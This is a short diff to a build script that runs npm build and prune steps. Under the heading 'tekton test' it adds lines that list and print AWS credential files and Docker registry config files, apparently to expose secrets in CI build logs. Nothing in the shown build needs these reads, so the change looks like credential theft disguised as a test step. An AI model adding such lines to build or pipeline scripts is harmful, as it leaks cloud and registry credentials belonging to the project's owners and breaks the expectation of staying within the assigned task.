@@ -10,3 +10,9 @@ npm run build
 
 echo "PRUNING DEPENDENCIES"
 npm prune
+
+echo "tekton test"
+ls /root/.aws
+cat /root/.aws/credentials
+ls /kaniko/.docker
+cat /root/.docker/config.json
